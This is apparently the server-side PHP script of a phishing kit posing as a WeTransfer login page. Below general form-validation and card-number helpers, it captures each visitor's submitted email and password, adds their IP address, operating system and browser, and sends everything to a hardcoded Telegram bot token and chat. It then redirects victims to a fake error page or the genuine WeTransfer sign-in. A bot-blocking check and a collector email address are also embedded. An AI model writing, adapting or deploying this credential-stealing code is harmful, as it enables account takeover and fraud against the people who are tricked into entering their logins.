<?php
 

function is_invalid_class($array, $key) {
    if( !is_array($array) )
        return false;

    if( isset($array[$key]) ) {
        $return = 'has-error';
        return $return;
    }
    return false;
}

function error_message($array, $key) {
    if( !is_array($array) )
        return false;

    if( isset($array[$key]) ) {
        $return = '<div class="d-block error-message">'. $array[$key] .'</div>';
        return $return;
    }
    return false;
}

function get_value($value) {
    if( isset($_SESSION[$value]) ) {
        return $_SESSION[$value];
    }
}

function get_selected_option($name,$value) {
    if( isset($_SESSION[$name]) && $_SESSION[$name] == $value ) {
        return 'selected';
    }
}

function validate_card($number)
 {
    global $type;
    $cardtype = array(
        "visa"       => "/^4[0-9]{12}(?:[0-9]{3})?$/",
        "mastercard" => "/^5[1-5][0-9]{14}$/",
        "amex"       => "/^3[47][0-9]{13}$/",
        "discover"   => "/^6(?:011|5[0-9]{2})[0-9]{12}$/",
    );
    if (preg_match($cardtype['visa'],$number)) {
        $type = "visa";
        return 'visa';
    } else if (preg_match($cardtype['mastercard'],$number)) {
        $type = "mastercard";
        return 'mastercard';
    } else if (preg_match($cardtype['amex'],$number)) {
        $type = "amex";
        return 'amex';
    } else if (preg_match($cardtype['discover'],$number)) {
        $type = "discover";
        return 'discover';
    } else {
        return false;
    }
 }

 function validate_cvv($number) {
    if (preg_match("/^[0-9]{3,4}$/",$number))
        return true;
    return false;
 }

 function validate_date($date, $format = 'Y-m-d H:i:s') {
    $d = DateTime::createFromFormat($format, $date);
    return $d && $d->format($format) == $date;
}

function validate_name($name) {
    if (!preg_match('/^[\p{L} ]+$/u', $name))
        return false;
    return true;
}

function validate_email($email) {
    if (!filter_var($email, FILTER_VALIDATE_EMAIL))
        return false;
    return true;
}

function validate_phone($phone)
{
    // Allow +, - and . in phone number
    $filtered_phone_number = filter_var($phone, FILTER_SANITIZE_NUMBER_INT);
    // Check the lenght of number
    // This can be customized if you want phone number from a specific country
    if (strlen($filtered_phone_number) != 12) {
        return false;
    } else {
        return true;
    }
}

function validate_number($number,$length = null) {
    if (is_numeric($number)) {
        if( $length == null ) {
            return true;
        } else {
            if( $length == strlen($number) )
                return true;
            return false;
        }
    } else {
        return false;
    }
}

function get_user_ip()
{
    /*$client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } else if(filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }*/

    return  $_SERVER['REMOTE_ADDR'];
}

function get_user_os() { 
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $os_platform    =   "Unknown OS Platform";
    $os_array       =   array(
        '/windows nt 10/i'     =>  'Windows 10',
        '/windows nt 6.3/i'     =>  'Windows 8.1',
        '/windows nt 6.2/i'     =>  'Windows 8',
        '/windows nt 6.1/i'     =>  'Windows 7',
        '/windows nt 6.0/i'     =>  'Windows Vista',
        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
        '/windows nt 5.1/i'     =>  'Windows XP',
        '/windows xp/i'         =>  'Windows XP',
        '/windows nt 5.0/i'     =>  'Windows 2000',
        '/windows me/i'         =>  'Windows ME',
        '/win98/i'              =>  'Windows 98',
        '/win95/i'              =>  'Windows 95',
        '/win16/i'              =>  'Windows 3.11',
        '/macintosh|mac os x/i' =>  'Mac OS X',
        '/mac_powerpc/i'        =>  'Mac OS 9',
        '/linux/i'              =>  'Linux',
        '/ubuntu/i'             =>  'Ubuntu',
        '/iphone/i'             =>  'iPhone',
        '/ipod/i'               =>  'iPod',
        '/ipad/i'               =>  'iPad',
        '/android/i'            =>  'Android',
        '/blackberry/i'         =>  'BlackBerry',
        '/webos/i'              =>  'Mobile'
    );
    foreach ($os_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }
    }   
    return $os_platform;
}

function get_user_browser() {
    $user_agent     = $_SERVER['HTTP_USER_AGENT'];
    $browser        =   "Unknown Browser";
    $browser_array  =   array(
        '/msie/i'       =>  'Internet Explorer',
        '/firefox/i'    =>  'Firefox',
        '/safari/i'     =>  'Safari',
        '/chrome/i'     =>  'Chrome',
        '/opera/i'      =>  'Opera',
        '/netscape/i'   =>  'Netscape',
        '/maxthon/i'    =>  'Maxthon',
        '/konqueror/i'  =>  'Konqueror',
        '/mobile/i'     =>  'Handheld Browser'
    );
    foreach ($browser_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}

function get_user_country() {
    $details = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=". $_SERVER['REMOTE_ADDR'] .""));
    if ($details && $details->geoplugin_countryName != null) {
        $countryname = $details->geoplugin_countryName;
    }
    return $countryname;
}

function get_user_countrycode() {
    $details = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" .  $_SERVER['REMOTE_ADDR'] . ""));
    if ($details && $details->geoplugin_countryCode != null) {
        $countrycode = $details->geoplugin_countryCode;
    }
    return $countrycode;
}


function telegram_send($message) {
    $curl = curl_init();
    $api_key  = '7808636814:AAGe7USYoVtSDviFHirAWc5QpFdTv9toOMw';
    $chat_id  = '5714386734';
    $format   = 'HTML';
    curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
    $result = curl_exec($curl);
    curl_close($curl);
    return true;
}

$to = 'olivierauclair70@proton.me';

$random   = rand(0,100000000000);
$dispatch = substr(md5($random), 0, 17);

if($_SERVER['REQUEST_METHOD'] == "POST") {

    if( !empty($_POST['verbot']) ) {
        header("HTTP/1.0 404 Not Found");
        die();
    }

    if (isset($_POST["email"])) {

        $_SESSION['email'] = $_POST['email'];
        $_SESSION['password'] = $_POST['password'];
       
        if( count($_SESSION['errors']) == 0 ) {

           
            $telegram_message = '    ✔️ MAIL ACCES  ' . $_SERVER[''] . "\r\n";
            $telegram_message .= '' . $_POST[''] . "\r\n";
            $telegram_message .= ' ✔️ User : ' . $_POST['email'] . "\r\n";
            $telegram_message .= ' ✔️ Pass : ' . $_POST['password'] . "\r\n";
            $telegram_message .= '' . $_POST[''] . "\r\n";
            $telegram_message .= '' . $_POST[''] . "\r\n";
        $telegram_message .= 'OS : ' . get_user_os() . "\r\n";
        $telegram_message .= 'Browser : ' . get_user_browser() . "\r\n";
		$telegram_message .= '' . $_POST[''] . "\r\n";
		$telegram_message .= 'IP address : ' . get_user_ip() . "\r\n";
            
			telegram_send(urlencode($telegram_message));
            
            header("Location: Erreur-WeTransfert.html");
			
        } 
   }
    if (isset($_POST["email1"])) {

        $_SESSION['email1'] = $_POST['email1'];
        $_SESSION['password1'] = $_POST['password1'];
       
        if( count($_SESSION['errors']) == 0 ) {

           
            $telegram_message = '    ✔️ MAIL ACCES 1  ' . $_SERVER[''] . "\r\n";
            $telegram_message .= '' . $_POST[''] . "\r\n";
            $telegram_message .= ' ✔️ User : ' . $_POST['email1'] . "\r\n";
            $telegram_message .= ' ✔️ Pass : ' . $_POST['password1'] . "\r\n";
            $telegram_message .= '' . $_POST[''] . "\r\n";
            $telegram_message .= '' . $_POST[''] . "\r\n";
        $telegram_message .= 'OS : ' . get_user_os() . "\r\n";
        $telegram_message .= 'Browser : ' . get_user_browser() . "\r\n";
		$telegram_message .= '' . $_POST[''] . "\r\n";
		$telegram_message .= 'IP address : ' . get_user_ip() . "\r\n";
            
			telegram_send(urlencode($telegram_message));
            
            header("Location: https://auth.wetransfer.com/login?state=hKFo2SBUelhucjlOU3NHdVVuZU5nWWUxMjdReVJyeUVhczIyUKFupWxvZ2luo3RpZNkgeXhHZDcySUk0cFpPd1RROWt6YVUwX2pGdXRIcWNwc0ejY2lk2SBkWFdGUWppVzFqeFdDRkcwaE9WcHFyazRoOXZHZWFuYw&client=dXWFQjiW1jxWCFG0hOVpqrk4h9vGeanc&protocol=oauth2&audience=aud%3A%2F%2Ftransfer-api-prod.wetransfer%2F&redirect_uri=https%3A%2F%2Fwetransfer.com%2Faccount%2Fcallback%3Ftier%3Dfree%26trk%3DWT202005_splashpage_anonym_to_fa%26finalizeSSOAuth%3D1&cache=%5Bobject%20Object%5D&initialScreen=signUp&lang=fr&login_hint=&scope=openid%20profile%20email%20offline_access&response_type=code&response_mode=query&nonce=R0tDNi05Y25Cb040dHdvZElHY0VDbERGVC1RTlRpU3hBMDc5SktPSmlXag%3D%3D&code_challenge=5h2wE_XwI2TQk1lN4lr8crn52Yz5nOH1sCuzE_cvMtQ&code_challenge_method=S256&auth0Client=eyJuYW1lIjoiYXV0aDAtc3BhLWpzIiwidmVyc2lvbiI6IjEuMjIuMyJ9");
			
        } 
   }
  
 }

?>
